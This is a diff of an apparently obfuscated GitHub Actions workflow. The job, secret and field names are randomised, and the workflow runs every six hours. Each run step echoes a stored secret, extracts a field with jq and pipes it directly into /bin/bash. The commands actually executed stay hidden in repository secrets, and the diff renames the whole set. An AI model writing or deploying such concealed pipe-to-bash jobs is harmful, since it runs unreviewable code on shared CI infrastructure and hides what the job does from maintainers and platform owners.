@@ -1,9 +1,10 @@
 name: gedeshi7618
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 5/6 * * *'
-jobs:  # 23567
+    - cron: '0 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,12 +12,12 @@ jobs:  # 23567
       - uses: actions/checkout@v4
       - name: gedeshi7618
         env:
-          merrf57828: ${{ secrets.merrf57828 }}
+          or2317: ${{ secrets.or2317 }}
         run: |
-          echo $merrf57828 | jq -r .pvz3 | /bin/bash
-          echo $mer91 | jq -r .ffue31686 | /bin/bash
-          echo $ehl3229 | jq -r .xhpnf9 | /bin/bash
-          echo $al2408 | jq -r .hmc0 | /bin/bash
-          echo $shiv77 | jq -r .ar933 | /bin/bash
-          echo $gphy74 | jq -r .fwve886 | /bin/bash
+          echo $or2317 | jq -r .a9 | /bin/bash
+          echo $k409 | jq -r .gxjzc487 | /bin/bash
+          echo $zpvut737 | jq -r .nskt5797 | /bin/bash
+          echo $uwau49 | jq -r .fkv0 | /bin/bash
+          echo $eg162 | jq -r .ubjm00 | /bin/bash
+          echo $xijij6 | jq -r .s576 | /bin/bash
 
